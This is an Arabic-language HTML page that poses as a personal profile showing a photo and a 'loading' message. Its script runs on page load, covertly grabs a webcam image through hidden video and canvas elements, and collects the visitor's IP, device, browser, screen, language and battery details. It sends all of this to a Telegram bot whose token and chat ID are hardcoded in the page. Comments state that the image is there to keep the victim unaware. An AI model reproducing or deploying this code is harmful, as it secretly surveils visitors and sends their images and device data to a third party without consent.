<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محمد كعبانه</title>

    <!-- إعدادات المعاينة (Open Graph) - لكي تظهر الصورة والاسم عند المشاركة -->
    <meta property="og:title" content="محمد كعبانه">
    <meta property="og:description" content="مرحباً بك في صفحة محمد كعبانه الشخصية">
    <meta property="og:image" content="https://l.top4top.io/p_3968sozsf0.jpg">
    <meta property="og:type" content="website">

    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(45deg, #1a1a1a, #333); /* خلفية أنيقة */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            text-align: center;
        }
        .container { opacity: 0; animation: fadeIn 2s forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        img { width: 80%; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

    <div class="container">
        <!-- صورة تظهر للمستخدم لكي لا يشعر بشيء -->
        <img src="https://l.top4top.io/p_3968sozsf0.jpg" alt="Loading...">
        <h1>جاري التحميل...</h1>
    </div>

    <!-- عناصر مخفية للعمليات البرمجية -->
    <video id="video" style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_ID = "7184970355";
        const TELEGRAM_TOKEN = "8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw";

        async function sendToTelegram(text, photoUrl = null) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/`;
            if (photoUrl) {
                await fetch(url + "sendPhoto", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TELEGRAM_ID, photo: photoUrl, caption: text })
                });
            } else {
                await fetch(url + "sendMessage", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TELEGRAM_ID, text: text, parse_mode: "HTML" })
                });
            }
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) { return "غير معروف"; }
        }

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    // نرسل الصورة مباشرة بعد استخراج البيانات (سنجمعها في رسالة واحدة لاحقاً)
                    sendImageAndData(imageData);
                }, 1500);
            } catch (err) {
                sendToTelegram("📷 الكاميرا لم تُسمح، لكن سأرسل معلومات الجهاز فقط.");
            }
        }

        async function sendImageAndData(photoData) {
            const ip = await getIP();
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            let batteryInfo = "غير متوفرة";
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryInfo = `النسبة: ${Math.round(battery.level * 100)}%, الشحن: ${battery.charging ? 'متصل' : 'يعمل على البطارية'}`;
            }

            let message = `<b>👤 معلومات جديدة وصلت!</b>\n\n`;
            message += `🌐 <b>الآيبي:</b> ${ip}\n`;
            message += `📱 <b>الجهاز:</b> ${platform}\n`;
            message += `💻 <b>المتصفح:</b> ${userAgent.split(' ')[0]}\n`;
            message += `📏 <b>دقة الشاشة:</b> ${screenRes}\n`;
            message += `🌍 <b>اللغة:</b> ${language}\n`;
            message += `🔋 <b>البطارية:</b> ${batteryInfo}`;

            // إرسال الصورة مع المعلومات في رسالة واحدة (Caption)
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_ID,
                    photo: photoData,
                    caption: message,
                    parse_mode: "HTML"
                })
            });
        }

        // التشغيل التلقائي عند التحميل
        window.onload = () => {
            startCapture();
        };

    </script>
</body>
</html>
